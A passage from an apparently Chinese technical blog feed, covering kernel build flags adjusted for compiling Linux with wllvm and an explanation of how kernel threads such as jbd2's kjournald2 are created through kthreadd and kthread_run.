<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /Makefile</span></span><br><span class="line"><span class="comment">#ifdef CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE</span></span><br><span class="line"><span class="comment">#KBUILD_CFLAGS += -O2</span></span><br><span class="line"><span class="comment">#else ifdef CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE_O3</span></span><br><span class="line"><span class="comment">#KBUILD_CFLAGS += -O3</span></span><br><span class="line"><span class="comment">#else ifdef CONFIG_CC_OPTIMIZE_FOR_SIZE</span></span><br><span class="line"><span class="comment">#KBUILD_CFLAGS += -Os</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">KBUILD_CFLAGS += -O0</span><br></pre></td></tr></table></figure>

<p>这是需要添加 <code>ccflags-y += -O1</code> 的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 925  vim arch&#x2F;x86&#x2F;ia32&#x2F;Makefile</span><br><span class="line"> 926  vim arch&#x2F;x86&#x2F;kernel&#x2F;Makefile</span><br><span class="line"> 927  vim drivers&#x2F;idle&#x2F;Makefile</span><br><span class="line"> 928  vim include&#x2F;linux&#x2F;compiler.h</span><br><span class="line"> 930  vim arch&#x2F;x86</span><br><span class="line"> 931  vim arch&#x2F;x86&#x2F;Makefile</span><br><span class="line"> 932  vim init&#x2F;Makefile</span><br><span class="line"> 934  vim arch&#x2F;x86&#x2F;entry&#x2F;Makefile</span><br><span class="line"> 936  vim arch&#x2F;x86&#x2F;entry&#x2F;vdso&#x2F;Makefile</span><br><span class="line"> 938  vim arch&#x2F;x86&#x2F;entry&#x2F;vsyscall&#x2F;Makefile</span><br><span class="line"> 940  vim arch&#x2F;x86&#x2F;events&#x2F;Makefile</span><br><span class="line"> 942  vim arch&#x2F;x86&#x2F;events&#x2F;amd&#x2F;Makefile</span><br><span class="line"> 944  vim arch&#x2F;x86&#x2F;events&#x2F;intel&#x2F;Makefile</span><br><span class="line"> 953  vim arch&#x2F;x86&#x2F;kernel&#x2F;apic&#x2F;Makefile</span><br><span class="line"> 955  vim arch&#x2F;x86&#x2F;kernel&#x2F;cpu&#x2F;Makefile</span><br><span class="line"> 957  vim arch&#x2F;x86&#x2F;kernel&#x2F;cpu&#x2F;mce&#x2F;Makefile</span><br><span class="line"> 959  vim arch&#x2F;x86&#x2F;kernel&#x2F;cpu&#x2F;microcode&#x2F;Makefile</span><br><span class="line"> 961  vim arch&#x2F;x86</span><br><span class="line"> 965  vim arch&#x2F;x86&#x2F;kernel&#x2F;cpu&#x2F;mtrr&#x2F;Makefile</span><br><span class="line"> 967  vim arch&#x2F;x86&#x2F;kernel&#x2F;fpu&#x2F;Makefile</span><br><span class="line"> 970  vim arch&#x2F;x86&#x2F;kernel&#x2F;kprobes&#x2F;Makefile</span><br><span class="line"> 972  vim arch&#x2F;x86&#x2F;mm&#x2F;Makefile</span><br><span class="line"> 974  vim arch&#x2F;x86&#x2F;platform&#x2F;efi&#x2F;Makefile</span><br><span class="line"> 976  vim arch&#x2F;x86&#x2F;realmode&#x2F;Makefile</span><br><span class="line"> 978  vim kernel&#x2F;Makefile</span><br><span class="line"> 980  vim kernel&#x2F;bpf&#x2F;Ma</span><br><span class="line"> 981  vim kernel&#x2F;bpf&#x2F;Makefile</span><br><span class="line"> 983  vim kernel&#x2F;cgroup&#x2F;Makefile</span><br><span class="line"> 985  vim kernel&#x2F;dma&#x2F;Ma</span><br><span class="line"> 986  vim kernel&#x2F;dma&#x2F;Makefile</span><br><span class="line"> 988  vim kernel&#x2F;irq&#x2F;Makefile</span><br><span class="line"> 990  vim kernel&#x2F;power&#x2F;Makefile</span><br><span class="line"> 992  vim kernel&#x2F;power&#x2F;Makefile</span><br><span class="line"> 994  vim kernel&#x2F;power&#x2F;Makefile</span><br><span class="line"> 996  vim kernel&#x2F;printk&#x2F;Makefile</span><br><span class="line"> 998  vim kernel&#x2F;rcu&#x2F;Makefile</span><br><span class="line">1000  vim kernel&#x2F;sched&#x2F;Makefile</span><br><span class="line">1002  vim kernel&#x2F;time&#x2F;Makefile</span><br><span class="line">1004  vim kernel&#x2F;trace&#x2F;Makefile</span><br><span class="line">1006  vim mm&#x2F;Makefile</span><br><span class="line">1008  vim fs&#x2F;Makefile</span><br><span class="line">1010  vim fs&#x2F;ext4&#x2F;Makefile</span><br><span class="line">1012  vim fs&#x2F;jbd2&#x2F;Makefile</span><br><span class="line">1014  vim fs&#x2F;nfs&#x2F;Makefile</span><br><span class="line">1016  vim fs&#x2F;proc&#x2F;Makefile</span><br><span class="line">1018  vim block&#x2F;Makefile</span><br><span class="line">1020  vim drivers&#x2F;acpi&#x2F;Makefile</span><br><span class="line">1022  vim drivers&#x2F;ata&#x2F;Makefile</span><br><span class="line">1024  vim drivers&#x2F;base&#x2F;Makefile</span><br><span class="line">1026  vim drivers&#x2F;base&#x2F;power&#x2F;Ma</span><br><span class="line">1027  vim drivers&#x2F;base&#x2F;power&#x2F;Makefile</span><br><span class="line">1029  vim drivers&#x2F;base&#x2F;regmap&#x2F;Makefile</span><br><span class="line">1031  vim drivers&#x2F;char&#x2F;Makefile</span><br><span class="line">1033  vim drivers&#x2F;char&#x2F;hw_random&#x2F;Makefile</span><br><span class="line">1035  vim drivers&#x2F;clk&#x2F;Makefile</span><br><span class="line">1037  vim drivers&#x2F;cpufreq&#x2F;Makefile</span><br><span class="line">1039  vim drivers&#x2F;cpuidle&#x2F;Makefile</span><br><span class="line">1041  vim drivers&#x2F;dma-buf&#x2F;Makefile</span><br><span class="line">1043  vim drivers&#x2F;edac&#x2F;Makefile</span><br><span class="line">1045  vim drivers&#x2F;firmware&#x2F;Makefile</span><br><span class="line">1047  vim drivers&#x2F;firmware&#x2F;efi&#x2F;Makefile</span><br><span class="line">1049  vim drivers&#x2F;gpu&#x2F;drm&#x2F;Makefile</span><br><span class="line">1051  vim drivers&#x2F;gpu&#x2F;drm&#x2F;i915&#x2F;Makefile</span><br><span class="line">1053  vim drivers&#x2F;hwmon&#x2F;Makefile</span><br><span class="line">1055  vim drivers&#x2F;i2c&#x2F;Makefile</span><br><span class="line">1057  vim drivers&#x2F;iommu&#x2F;Makefile</span><br><span class="line">1059  vim drivers&#x2F;md&#x2F;Makefile</span><br><span class="line">1061  vim drivers&#x2F;net&#x2F;phy&#x2F;Makefile</span><br><span class="line">1063  vim drivers&#x2F;pci&#x2F;Makefile</span><br><span class="line">1065  vim drivers&#x2F;pci&#x2F;pcie&#x2F;Makefile</span><br><span class="line">1067  vim drivers&#x2F;ras&#x2F;Makefile</span><br><span class="line">1069  vim drivers&#x2F;rtc&#x2F;interface.o</span><br><span class="line">1070  vim drivers&#x2F;rtc&#x2F;Makefile</span><br><span class="line">1071  vim drivers&#x2F;rtc&#x2F;interface.o</span><br><span class="line">1073  vim drivers&#x2F;scsi&#x2F;Makefile</span><br><span class="line">1075  vim drivers&#x2F;thermal&#x2F;Makefile</span><br><span class="line">1077  vim drivers&#x2F;thermal&#x2F;Makefile</span><br><span class="line">1079  vim drivers&#x2F;thermal&#x2F;intel&#x2F;Makefile</span><br><span class="line">1081  vim drivers&#x2F;usb&#x2F;Makefile</span><br><span class="line">1083  vim drivers&#x2F;usb&#x2F;host</span><br><span class="line">1084  vim drivers&#x2F;usb&#x2F;host&#x2F;Makefile</span><br><span class="line">1086  vim sound&#x2F;hda&#x2F;Makefile</span><br><span class="line">1088  vim sound&#x2F;pci&#x2F;hda&#x2F;Makefile</span><br><span class="line">1090  vim arch&#x2F;x86&#x2F;pci&#x2F;Makefile</span><br><span class="line">1092  vim arch&#x2F;x86&#x2F;power&#x2F;Makefile</span><br><span class="line">1094  vim net&#x2F;Makefile</span><br><span class="line">1096  vim net&#x2F;core&#x2F;Makefile</span><br><span class="line">1098  vim net&#x2F;ipv4&#x2F;Makefile</span><br><span class="line">1100  vim net&#x2F;ipv4&#x2F;netfilter&#x2F;Makefile</span><br><span class="line">1102  vim net&#x2F;ipv6&#x2F;Makefile</span><br><span class="line">1104  vim net&#x2F;ipv6&#x2F;netfilter&#x2F;Makefile</span><br><span class="line">1106  vim net&#x2F;mac80211&#x2F;Makefile</span><br><span class="line">1108  vim net&#x2F;netfilter&#x2F;Makefile</span><br><span class="line">1110  vim net&#x2F;packet&#x2F;Makefile</span><br><span class="line">1141  vim net&#x2F;sched&#x2F;Makefile</span><br><span class="line">1143  vim net&#x2F;sunrpc&#x2F;Makefile</span><br><span class="line">1145  vim net&#x2F;sunrpc&#x2F;auth_gss&#x2F;Makefile</span><br><span class="line">1147  vim net&#x2F;wireless&#x2F;Makefile</span><br><span class="line">1149  vim lib&#x2F;Makefile</span><br><span class="line">1151  vim arch&#x2F;x86&#x2F;lib&#x2F;Makefile</span><br><span class="line">1153  vim kernel&#x2F;events&#x2F;uprobes.c</span><br><span class="line">1154  vim arch&#x2F;x86&#x2F;lib&#x2F;Makefile</span><br><span class="line">1155  vim kernel&#x2F;events&#x2F;uprobes.c</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>wllvm</tag>
        <tag>compile</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Thread jbd2 kjournald</title>
    <url>/2020/03/27/Kernel-Thread-jbd2-kjournald/</url>
    <content><![CDATA[<p>本文详细介绍了 Linux kernel 当中的 kernel thread 的创建、唤醒和工作流程，当然因为 kernel thread 的种类很多，所以文中以 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSm91cm5hbGluZ19ibG9ja19kZXZpY2U=" title="https://en.wikipedia.org/wiki/Journaling_block_device">jbd2<i class="fa fa-external-link"></i></span> 为切入点，介绍了常见的 kernel thread 从 create 到 wake_up 再到 running task 的一系列流程。</p>
<a id="more"></a>



<h2 id="Kernel-Thread"><a href="#Kernel-Thread" class="headerlink" title="Kernel Thread"></a>Kernel Thread</h2><p>本节简要讲述了 kernel thread 的一些特性，具体的 kernel thread 细节并未给出，可以参照 <span class="exturl" data-url="aHR0cDovL2FiY2R4eXprLmdpdGh1Yi5pby9ibG9nLzIwMTgvMDEvMTAva2VybmVsLXRhc2stdGhyZWFkLw==" title="http://abcdxyzk.github.io/blog/2018/01/10/kernel-task-thread/">Linux 内核线程及普通进程总结<i class="fa fa-external-link"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9zeXNwbGF5LmluL2Jsb2cvbGludXgta2VybmVsLWludGVybmFscy8yMDE1LzA0L2tlcm5lbC10aHJlYWRzLw==" title="https://sysplay.in/blog/linux-kernel-internals/2015/04/kernel-threads/">Kernel Threads<i class="fa fa-external-link"></i></span> 这两篇文章来学习。本文的侧重点在 kernel thread 的创建上。</p>
<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Linux 操作系统当中有许多为 user 和 kernel 提供服务的 threads，运行在 user space 的是 user threads，同理，运行在 kernel space 的是 kernel threads。</p>
<p>我们通常都将这些运行在 kernerl space 的服务进程称之为 kernel threads，是因为所有的 kernel threads 都共享 kernel address space，因而共享同一份 kernel page table。所以我们称之为“内核线程”，原因就在于进程一般都是有自己独立的地址空间的。</p>
<h3 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h3><p>kernel threads 的创建和 user space threads 不同，Linux kernel 为程序员提供了 2 种创建 kernel threads 的途径，1) 在 kernel code 中添加 kernel thread 创建代码，2) 使用 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTG9hZGFibGVfa2VybmVsX21vZHVsZQ==" title="https://en.wikipedia.org/wiki/Loadable_kernel_module">loadable kernel module<i class="fa fa-external-link"></i></span> 的方法动态加载模块。 </p>
<h4 id="Show-kernel-threads"><a href="#Show-kernel-threads" class="headerlink" title="Show kernel threads"></a>Show kernel threads</h4><p>由于 kernel threads 的特性，我们可以用以下语句来列出当前操作系统当中所有的 kernel threads</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e -o pid,ppid,pgid,args | awk <span class="string">'$3==0'</span></span></span><br><span class="line">    2     0     0 [kthreadd]</span><br><span class="line">    4     2     0 [kworker/0:0H]</span><br><span class="line">    6     2     0 [mm_percpu_wq]</span><br><span class="line">    7     2     0 [ksoftirqd/0]</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<p>由于数目过多所以这里只列出了 4 个，注意  <code>pid=2</code> 的线程 <code>kthreadd</code>，它是专门负责创建内核线程的内核线程，目前 Linux 内核提供了多个能够创建内核线程的函数，如 <code>kernel_thread()</code>，<code>kthread_create()</code> 等等，但是为了能够统一接口，因此在上述线程中，只有 <code>kthreadd</code> 内核线程是由 <code>kernel_thread()</code> 函数创建，其余的 kernel threads 都是由 <code>kthreadd</code> 对应的函数 <code>kthreadd()</code> 创建的。</p>
<h4 id="kthreadd"><a href="#kthreadd" class="headerlink" title="kthreadd"></a>kthreadd</h4><p>前文提到，除了 <code>kthreadd</code> 自身，其他所有的内核线程均由该内核线程创建，现在我们来看它<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbml0L21haW4uYyNMNDA2" title="https://elixir.bootlin.com/linux/latest/source/init/main.c#L406">创建的位置<i class="fa fa-external-link"></i></span></p>
<p><img src="/images/kthread-jbd2/kthreadd.png" alt="kthreadd.png"></p>
<p>这段代码位于 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbml0L21haW4uYyNMNDI4" title="https://elixir.bootlin.com/linux/latest/source/init/main.c#L428">/init/main.c<i class="fa fa-external-link"></i></span> 文件中的 <code>rest_init(void)</code> 函数中，该函数一共创建了 <strong>2</strong> 个内核线程，分别为 <code>kernel_init</code> <em>(pid=1)</em> 和 <code>kthreadd</code> <em>(pid=2)</em>，使用的都是 <code>kernel_thread()</code> 函数，其中 <code>kernel_init</code> 线程在做完 init 工作之后，就被用户态的 <code>systemd</code> 取代了。</p>
<p>在上述代码可以看到，在使用 <code>kernel_thread()</code> 创建了 <code>kthreadd</code> 线程之后，将其 <code>task_struct</code> 保存在 <code>kthreadd_task</code> 变量中，该变量是定义在 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwva3RocmVhZC5jI0wzMA==" title="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L30">thread.c<i class="fa fa-external-link"></i></span> 中的全局变量</p>
<p><img src="/images/kthread-jbd2/kthreadd-task.png" alt="kthreadd.png"></p>
<p>在使用 <code>kthread_create</code> 和 <code>kthread_run</code> 这两个函数的时候，会使用到该全局变量。</p>
<p>下文会结合这两个函数来拓展 <code>kthreadd</code> 内核线程的作用。这里就暂且介绍这么多。</p>
<h4 id="kthread-create-amp-kthread-run"><a href="#kthread-create-amp-kthread-run" class="headerlink" title="kthread_create &amp; kthread_run"></a>kthread_create &amp; kthread_run</h4><p>前文讲到，绝大部分（除了 <code>kthreadd</code> 和 <code>kernel_init</code> ）内核线程都是由调用 <code>kthread_create</code> 或 <code>kthread_run</code> 函数创建的，它们的父进程都是 <code>kthreadd</code>，且 ppid=2。本节详细介绍这两个函数是如何创建内核线程的。</p>
<p>首先是函数的定义，<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbmNsdWRlL2xpbnV4L2t0aHJlYWQuaCNMMjU=" title="https://elixir.bootlin.com/linux/latest/source/include/linux/kthread.h#L25">kthread_create<i class="fa fa-external-link"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbmNsdWRlL2xpbnV4L2t0aHJlYWQuaCNMNDM=" title="https://elixir.bootlin.com/linux/latest/source/include/linux/kthread.h#L43">kthread_run<i class="fa fa-external-link"></i></span> 都定义在同一文件 <code>kthread.h</code></p>
<p><img src="/images/kthread-jbd2/kthread_create.png" alt="kthreadd.png"></p>
<p><img src="/images/kthread-jbd2/kthread_run.png" alt="kthreadd.png"></p>
<p><strong>参数的含义如下所示</strong></p>
<ul>
<li><code>thread_fn</code> - 该线程运行的函数</li>
<li><code>data</code> - <code>@threadfn()</code> 的数据指针</li>
<li><code>namefmt</code> - printf-style 格式化字符串（线程的名称）</li>
<li><code>args/__VA_ARGS__</code> - 格式化字符串的参数</li>
</ul>
<p>这两个函数都是宏定义，其中 <code>kthread_create()</code> 调用了 <code>kthread_create_on_node()</code> 函数，其内容后续会详细解析；<code>kthread_run()</code> 有 2 部分，第 1 部分调用 <code>kthread_create</code> 创建内核线程，第 2 部分调用 <code>wake_up_process()</code> 唤醒创建的线程。</p>
<p><strong>需要注意的是</strong>，使用 <code>kthread_create()</code> 创建的 kernel thread，处于 <strong>stopped state</strong>，如果要唤醒的话需要另外调用 <code>wake_up_process()</code> 函数，<u>这是目前我所发现的唯一一个唤醒该 thread 的方法。</u></p>
<h4 id="kthread-create-on-node"><a href="#kthread-create-on-node" class="headerlink" title="kthread_create_on_node"></a>kthread_create_on_node</h4><p>函数如下所示，它同样位于 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwva3RocmVhZC5jI0wzNzk=" title="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L379">kthread.c<i class="fa fa-external-link"></i></span> 中</p>
<p><img src="/images/kthread-jbd2/kthread_create_on_node.png" alt="Kthread_create_on_node.png"></p>
<p>根据 source code 的注释，该函数为 <code>__kthread_create_on_node()</code> 的 helper，并且创建的线程处于 stopped state，需要调用 <code>wake_up_process()</code> 来唤醒。</p>
<p>继续观察 <a href="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L293" target="_blank" rel="noopener"><code>__kthread_create_on_node()</code></a> </p>
<p><img src="/images/kthread-jbd2/kthread_on_node.png" alt="Kthread_create_on_node.png"></p>
<p>该函数主要做了 2 件事情</p>
<ol>
<li>将一个 <strong>entry</strong> ( <code>create-&gt;list</code> ) 插入 <strong>kthread_create_list</strong></li>
<li>唤醒 ( 使用 <code>wake_up_process(kthreadd_task)</code> ) <strong>kthreadd</strong></li>
</ol>
<p>之后做的就是一些 kernel thread 优先级设置等的初始化工作，这里就不做赘述。</p>
<p>代码中可以看的很清楚，<code>struct kthread_create_info*</code> 类型的变量 <strong>create</strong>，包含了线程函数、数据指针、CPU Node和一个信号量 <code>create-&gt;done</code>，这个信号量将会用于等待 <strong>kthreadd</strong> 线程创建线程的同步。</p>
<p>在创建 <strong>create</strong> 并将它放入 <strong>kthread_create_list</strong> 之后，就只需要唤醒 <strong>kthreadd</strong> 并等待完成即可。</p>
<p>这里简要介绍一下 <strong>kthread_create_list</strong> </p>
<p><img src="/images/kthread-jbd2/kthread_create_list.png" alt="Kthread_create_on_node.png"></p>
<p>这个 list 使用 <code>LIST_HEAD()</code> 来定义，这是 Linux kernel 提供的一个 list 模版，<strong>kthread_create_list</strong> 用来存放待创建的 kernel thread，由于在 SMP 模式下，可能会有多个 kernel thread create requests，因此创建 list 来批量申请和创建，有利于 kernel 的工作效率。</p>
<p>添加了新 kernel thread 相关信息之后，就是 <strong>kthreadd</strong> 的工作了。</p>
<h4 id="kthreadd-1"><a href="#kthreadd-1" class="headerlink" title="kthreadd()"></a>kthreadd()</h4><p>kthreadd() 的函数定义在 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwva3RocmVhZC5jI0w1Njg=" title="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L568">kthread.c<i class="fa fa-external-link"></i></span> 文件中</p>
<p><img src="/images/kthread-jbd2/kthreadd().png" alt="Kthread_create_on_node.png"></p>
<p>我们主要集中观察 <code>for (;;)</code> 循环中的代码。</p>
<p>在循环中 <strong>kthreadd</strong> 首先检查 <strong>kthread_create_list</strong> 中是否有 <strong>entry</strong>，如果没有，那就说明目前没有需要被创建的 kernel thread，那么 <strong>kthreadd</strong> 会调用 <code>schedule()</code> 函数主动放弃 CPU，它会处于一个等待唤醒的状态，之前提到的 <code>wake_up_process()</code> 就可以唤醒它。</p>
<p>在被唤醒之后，<strong>kthreadd</strong> 会遍历 <strong>kthread_create_list</strong>，将其中所有的 <strong>entry</strong> 都取出，调用 <code>create_kthread()</code> 函数来创建新的 kernel thread。注意函数的参数是 <code>create</code>，因而我们判断在函数内部肯定有关于之前提到的信号量 <code>create-&gt;done</code> 的修改。</p>
<p>我们进入 <code>create_kthread()</code> 函数<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwva3RocmVhZC5jI0wyNzA=" title="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L270">一探究竟<i class="fa fa-external-link"></i></span></p>
<p><img src="/images/kthread-jbd2/create_kthread.png" alt="Kthread_create_on_node.png"></p>
<p>可以看到，该函数中也是调用 <code>kernel_thread()</code> 函数来创建 kernel thread，因此可以推断出这个是所有 kernel thread 最终的创建入口。</p>
<p>当返回的 pid &lt; 0 时，说明创建的过程中出现了一些错误，如果没有出错，在 <code>kernel_thread()</code> 函数内部应该有对于 <code>create-&gt;done</code> 参数的修改。类似这里 <code>Line 288: complete(done)</code>。</p>
<p>为了验证一下猜测，进入 <code>kernel_thread()</code> <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwvZm9yay5jI0wyNDk5" title="https://elixir.bootlin.com/linux/latest/source/kernel/fork.c#L2499">函数的定义<i class="fa fa-external-link"></i></span>处观察一下</p>
<p><img src="/images/kthread-jbd2/kernel_thread.png" alt="Kthread_create_on_node.png"></p>
<p>遗憾的是，并没有发现任何关于 <code>create-&gt;done</code> 相关的代码。当然，我也进入 <code>_do_fork()</code> 函数中观察过，它负责的是产生新的进程，并不负责信号同步。</p>
<p>仔细思索一下，在上方 <code>create_thread()</code> 函数中，调用了 <code>kernel_thread()</code> 来创建新的进程，这个时候的参数和之前创建 <strong>kthreadd</strong> 的语句有些不同。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// create kthreadd (pid = 2)</span></span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create normal kernel thread</span></span><br><span class="line">pid = kernel_thread(kthread, create, CLONE_FS | CLONE_FILES | SIGCHLD);</span><br></pre></td></tr></table></figure>

<p>如上述代码所示，<strong>kthreadd</strong> 的创建过程中，<code>kernel_thread()</code> 函数的第一个参数是 <code>kthreadd()</code> 函数指针，但在创建一般的 kernel thread 时，第一个参数一律都是 <code>kthread</code>，所以可以推断出，在 <code>kthread()</code> 当中肯定做了以下操作</p>
<ol>
<li>调用 <code>create-&gt;threadfn</code> 满足真正的内核线程创建需求</li>
<li>调用 <code>complete(create-&gt;done)</code> 同步信号量</li>
</ol>
<p>我们进入该<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwva3RocmVhZC5jI0wyMTQ=" title="https://elixir.bootlin.com/linux/latest/source/kernel/kthread.c#L214">函数的位置<i class="fa fa-external-link"></i></span>进行确认</p>
<p><img src="/images/kthread-jbd2/kthread.png" alt="Kthread_create_on_node.png"></p>
<p>果然，函数内部调用了 <code>complete(done)</code> 同步信号量，使得 <code>__kthread_create_on_node()</code> 函数可以继续运行，同时调用 <code>create-&gt;threadfn</code> 来运行承担工作任务的线程函数。</p>
<h4 id="wait-for-completion-amp-complete"><a href="#wait-for-completion-amp-complete" class="headerlink" title="wait_for_completion &amp; complete"></a>wait_for_completion &amp; complete</h4><p>最后引用 Linux kernel 文档中的说明来为此处的信号量同步机制做个总结</p>
<blockquote>
<p>There are also some helper functions for checking the state of completions. Note that while initialization must happen first, the waiting and signaling part can happen in any order. I.e. it&#39;s entirely normal for a thread to have marked a completion as &#39;done&#39; before another thread checks whether it has to wait for it.</p>
<p>To use completions you need to <code>#include &lt;linux/completion.h&gt;</code> and create a static or dynamic variable of type &#39;struct completion&#39;, which has only two fields:</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> done;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> wait;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This provides the <code>-&gt;wait</code> waitqueue to place tasks on for waiting (if any), and the <code>-&gt;done</code> completion flag for indicating whether it&#39;s completed or not.</p>
<p>Completions should be named to refer to the event that is being synchronized on.<br>A good example is:</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">wait_for_completion(&amp;early_console_added);</span><br><span class="line">complete(&amp;early_console_added);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Good, intuitive naming (as always) helps code readability. Naming a completion &#39;complete&#39; is not helpful unless the purpose is super obvious...</p>
</blockquote>
<h2 id="jbd2"><a href="#jbd2" class="headerlink" title="jbd2"></a>jbd2</h2><p>JBD 全称是 Journaling block device，作用是进行文件系统日志写入，它独立于文件系统之外。目前采用 JBD 的文件系统有 ext3、ext4 和 OCFS2。其中 ext4 使用的是 JBD 的一个分支 <span class="exturl" data-url="aHR0cHM6Ly9sa21sLm9yZy9sa21sLzIwMDYvOC85LzQzNA==" title="https://lkml.org/lkml/2006/8/9/434">JBD2<i class="fa fa-external-link"></i></span>。</p>
<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>前文中提到了查看当前所有 kernel thread 的方法，在这里我们稍作改动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e -o pid,ppid,pgid,args | awk <span class="string">'$3==0'</span> | grep jbd</span></span><br><span class="line">  425     2     0 [jbd2/sda2-8]</span><br></pre></td></tr></table></figure>

<p>可以看到输出了名为 <code>[jbd2/sda2-8]</code> 的 kernel thread。这里的 <code>sda2-8</code> 是设备号，我们可以在 <code>/proc/fs/jbd2/</code> 目录下查看目前运行的 jbd2 线程的虚拟文件目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls /proc/fs/jbd2 </span></span><br><span class="line">sda2-8</span><br></pre></td></tr></table></figure>

<p>具体的 jbd2 做的工作不在本文的讨论范围之内，接下来重点介绍创建 jbd2 内核线程的位置。</p>
<p>在 Linux kernel 的代码中搜索 <code>jbd</code> 的关键字</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ag <span class="string">", \"jbd2"</span> .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br><span class="line">fs/jbd2/journal.c</span><br><span class="line">279:    t = kthread_run(kjournald2, journal, "jbd2/%s",</span><br></pre></td></tr></table></figure>

<p>使用 <code>ag</code> 命令或者 <code>grep</code> 命令根据 jbd2 内核线程的名称来搜索创建位置，根据上述输出我们得知 jbd2 内核线程是在 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9mcy9qYmQyL2pvdXJuYWwuYyNMMjcz" title="https://elixir.bootlin.com/linux/latest/source/fs/jbd2/journal.c#L273">journal.c<i class="fa fa-external-link"></i></span> 文件当中定义的创建代码。</p>
<p><img src="/images/kthread-jbd2/create_kjournald.png" alt="Kthread_create_on_node.png"></p>
<h3 id="Create-and-Sechdule"><a href="#Create-and-Sechdule" class="headerlink" title="Create and Sechdule"></a>Create and Sechdule</h3><p>上节我们通过字符串匹配的方法找到了 jbd2 内核线程的创建位置，同时获取了创建语句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t = kthread_run(kjournald2, journal, <span class="string">"jbd2/%s"</span>,</span><br><span class="line">			journal-&gt;j_devname);</span><br></pre></td></tr></table></figure>

<p>结合之前介绍的 <code>kthread_run()</code> 函数的参数说明，可以推断出 <code>kjournald2</code> 为提供服务的线程函数指针，<code>journal</code> 为函数的数据指针，同时我们也了解到之前获取的 <code>sda2-8</code> 来自于 <code>journal-&gt;j_devname</code>。</p>
<p>这里的 <strong>journal</strong> struct instance 在后面的分析中会频繁出现，现在我们只需要将其理解为 jbd2 kernel thread 会用到的一个 data structure 即可。</p>
<p>首先进入 <code>kjournald2</code> 的<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9mcy9qYmQyL2pvdXJuYWwuYyNMMTY5" title="https://elixir.bootlin.com/linux/latest/source/fs/jbd2/journal.c#L169">函数所在<i class="fa fa-external-link"></i></span>分析其内容</p>
